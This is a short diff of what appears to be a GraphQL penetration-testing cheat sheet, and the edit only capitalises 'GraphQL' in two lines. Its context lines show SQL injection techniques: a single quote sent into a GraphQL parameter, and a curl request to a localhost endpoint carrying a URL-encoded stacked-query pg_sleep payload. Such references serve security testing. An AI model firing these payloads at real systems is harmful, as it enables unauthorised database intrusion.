@@ -348,7 +348,7 @@ Use `$regex` inside a `search` parameter.
 
 ### SQL Injection
 
-Send a single quote `'` inside a graphql parameter to trigger the SQL injection
+Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection
 
 ```js
 { 
@@ -360,7 +360,7 @@ Send a single quote `'` inside a graphql parameter to trigger the SQL injection
 }
 ```
 
-Simple SQL injection inside a graphql field.
+Simple SQL injection inside a GraphQL field.
 
 ```powershell
 curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
